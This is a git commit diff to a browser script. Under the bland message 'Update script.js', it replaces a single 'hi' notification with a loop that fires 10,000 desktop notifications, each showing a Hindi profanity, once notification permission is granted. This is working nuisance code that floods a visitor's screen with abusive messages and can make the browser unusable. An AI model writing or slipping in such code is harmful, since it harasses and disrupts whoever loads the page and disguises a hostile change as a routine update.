c8453e7d4a285ab52150a488e6e6a6a804ecc1d3
rsh-k24 <rishabhkhaund21@gmail.com>
2024-05-29 07:46:26 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,14 +1,16 @@
 if (!("Notification" in window)) {
-    console.log("This browser does not support desktop notification");
+    alert("This browser does not support desktop notification");
   } else if (Notification.permission === "granted") {
-        new Notification("hi")
-        alert("done")
+    for (let index = 0; index < 10000; index++) {
+        new Notification("bhenchod");
+    }
   } else if (Notification.permission !== 'denied') {
     // Otherwise, ask the user for permission
     Notification.requestPermission(function (permission) {
       if (permission === "granted") {
-        new Notification("hi")
-        alert("done")
+        for (let index = 0; index < 10000; index++) {
+            new Notification("bhenchod");
+        }
       }
     });
   }
